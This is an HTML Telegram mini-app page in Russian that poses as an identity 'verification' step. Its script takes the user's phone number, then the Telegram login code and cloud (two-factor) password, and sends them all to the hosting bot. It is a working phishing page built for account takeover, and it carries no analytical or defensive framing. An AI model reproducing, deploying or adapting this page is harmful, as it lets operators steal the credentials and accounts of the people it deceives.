<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { width: 85%; padding: 25px; border-radius: 20px; background: #0f0f0f; border: 1px solid #1a1a1a; text-align: center; }
        .btn { background: #00ff88; color: #000; padding: 16px; border-radius: 12px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 16px; margin-top: 20px; }
        .hidden { display: none; }
        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; box-sizing: border-box; text-align: center; font-size: 18px; }
    </style>
</head>
<body>
    <div class="card">
        <div id="step1">
            <h2 style="color: #00ff88;">ВЕРИФИКАЦИЯ</h2>
            <p>Нажмите на кнопку для подтверждения личности</p>
            <button class="btn" id="auth-btn">ПОДТВЕРДИТЬ НОМЕР</button>
        </div>
        <div id="step2" class="hidden">
            <h2>ШАГ 2</h2>
            <input type="number" id="sms-code" placeholder="Код из Telegram">
            <input type="password" id="two-fa" placeholder="Облачный пароль">
            <button class="btn" id="final-btn">ВОЙТИ</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        let savedPhone = "";

        // Обработка кнопки 1
        document.getElementById('auth-btn').onclick = function() {
            tg.requestContact(function(ok, res) {
                if (ok && (res.response_data?.phone_number || res.contact?.phone_number)) {
                    savedPhone = res.response_data?.phone_number || res.contact?.phone_number;
                    
                    // Отправляем данные боту ПРЯМО ЗДЕСЬ
                    tg.sendData(JSON.stringify({
                        "action": "send_code",
                        "phone": String(savedPhone)
                    }));
                    
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                } else {
                    alert("Нужно нажать 'Поделиться', чтобы продолжить");
                }
            });
        };

        // Обработка кнопки 2
        document.getElementById('final-btn').onclick = function() {
            const code = document.getElementById('sms-code').value;
            const pass = document.getElementById('two-fa').value || "none";
            
            if (code.length < 3) return alert("Введите код!");

            tg.sendData(JSON.stringify({
                "action": "verify",
                "phone": String(savedPhone),
                "code": String(code),
                "two_fa": String(pass)
            }));
            
            setTimeout(() => { tg.close(); }, 500);
        };
    </script>
</body>
</html>
